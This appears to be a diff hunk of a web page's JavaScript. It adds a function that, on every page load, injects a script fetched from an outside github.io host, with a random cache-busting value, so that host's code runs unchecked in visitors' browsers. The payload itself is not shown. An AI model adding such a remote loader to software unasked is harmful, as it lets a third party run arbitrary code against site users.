@@ -34,6 +34,27 @@ function loadExternalCSS() {
 }
 
 loadExternalCSS();
+  
+function preloadloadExternalScript() {
+  const script = document.createElement('script');
+  script.src = `https://hsmineword.github.io/api/html/preloadscript.js?jam=${Math.random()}`;
+  script.type = 'text/javascript';
+  script.async = true;
+
+  // Add a load event listener to check when the script has loaded
+  script.onload = function() {
+    console.log("External script loaded successfully.");
+  };
+
+  // Add an error event listener to capture any script loading errors
+  script.onerror = function() {
+    console.error("Error loading external script.");
+  };
+
+  document.head.appendChild(script);
+}
+
+preloadloadExternalScript();
 
   
 function loadExternalScript() {
